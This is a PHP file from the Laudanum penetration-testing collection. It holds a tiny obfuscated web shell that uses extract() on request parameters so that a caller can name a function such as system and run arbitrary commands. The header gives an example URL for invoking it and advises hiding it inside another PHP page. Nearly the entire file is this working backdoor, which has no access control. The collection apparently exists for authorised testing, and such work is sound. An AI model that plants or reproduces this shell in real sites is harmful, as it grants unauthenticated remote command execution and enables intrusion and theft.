/*
******************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net
***         Tim Medin <tim@counterhack.com>
***
*** Copyright 2014 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides access to the file system.
*** Written by Tim Medin <tim@counterhack.com>
***
********************************************************************************
***
*** This is a tiny shell that is well obfuscated
*** to use it run it thusly:
***   http://Site/shell.php?ctime=system&atime=ls+la
*** It is best hidden in another php page
***
*** WARNING: This shell is not protected by an ip filter or credential check
********************************************************************************
*/

@extract($_REQUEST);
@die ($ctime($atime));
